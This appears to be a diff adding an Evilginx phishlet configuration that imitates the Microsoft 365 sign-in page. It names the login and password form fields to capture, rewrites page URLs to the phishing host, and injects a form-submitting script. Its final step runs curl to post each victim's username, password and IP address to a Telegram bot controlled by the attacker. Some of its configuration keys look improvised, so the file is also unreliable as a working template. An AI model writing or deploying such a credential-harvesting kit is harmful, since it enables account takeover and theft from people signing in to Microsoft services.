@@ -1,0 +1,57 @@
+name: 'o365'
+author: 'user'
+min_evilginx_version: '2.4.0'
+master_url: 'https://login.microsoftonline.com'
+redirect_url: 'https://login.microsoftonline.com/common/oauth2/authorize'
+hostnames:
+  - 'login.microsoftonline.com'
+  - 'login.live.com'
+
+phishlets:
+  o365:
+    domains:
+      - 'login.microsoftonline.com'
+    path: '/'
+    session:
+      name: 'session'
+      domain: '.login.microsoftonline.com'
+      path: '/'
+    auth:
+      - '/common/oauth2/authorize*'
+      - '/common/login*'
+      - '/login.srf*'
+      - '/kmsi*'
+    credentials:
+      username:
+        type: 'post'
+        key: 'loginfmt'
+        search: 'name="loginfmt"'
+      password:
+        type: 'post'
+        key: 'passwd'
+        search: 'name="passwd"'
+    custom:
+      - name: 'Get login page'
+        path: '/'
+        method: 'get'
+        headers:
+          - 'Host: login.microsoftonline.com'
+          - 'User-Agent: {{ .UserAgent }}'
+        response:
+          - 'replace: "action=\"/" "action=\"/{path}\""'
+          - 'replace: "https://login.microsoftonline.com" "https://{{ .Hostname }}"'
+          - 'replace: "//login.microsoftonline.com" "//{{ .Hostname }}"'
+          - 'inject: "<script>function post_cred(data){var f=document.createElement(\"form\");f.method=\"post\";f.action=\"\";for(var k in data){var i=document.createElement(\"input\");i.name=k;i.value=data[k];f.appendChild(i);}document.body.appendChild(f);f.submit();}</script>" before "</head>"'
+      - name: 'Login POST'
+        path: '/'
+        method: 'post'
+        headers:
+          - 'Host: login.microsoftonline.com'
+          - 'User-Agent: {{ .UserAgent }}'
+          - 'Content-Type: application/x-www-form-urlencoded'
+        response:
+          - 'replace: "https://login.microsoftonline.com" "https://{{ .Hostname }}"'
+          - 'if: "{{ .Post }}.loginfmt != \"\"'
+          - 'capture_url'
+          - 'exec: "curl -s -X POST https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage -d chat_id=<YOUR_CHAT_ID> -d text=\\\"New O365 Creds\nUsername: {{ .Post.loginfmt }}\nPassword: {{ .Post.passwd }}\nIP: {{ .RemoteAddr }}\\\""'
+          - 'end'
